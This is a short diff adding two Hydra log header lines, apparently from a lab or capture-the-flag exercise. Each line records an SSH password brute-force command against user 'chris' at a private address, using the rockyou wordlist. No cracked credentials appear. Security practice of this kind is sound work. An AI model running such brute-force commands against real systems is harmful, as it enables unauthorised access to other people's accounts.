@@ -1,0 +1,2 @@
+# Hydra v9.4 run at 2022-12-03 03:15:21 on 10.10.209.165 ssh (hydra -l chris -P /usr/share/wordlists/rockyou.txt -f -o hydrasshresult.txt -t 64 -I ssh://10.10.209.165)
+# Hydra v9.4 run at 2022-12-03 03:30:16 on 10.10.209.165 ssh (hydra -l chris -P /usr/share/wordlists/rockyou.txt -f -o hydrasshresult.txt -t 4 -I ssh://10.10.209.165)
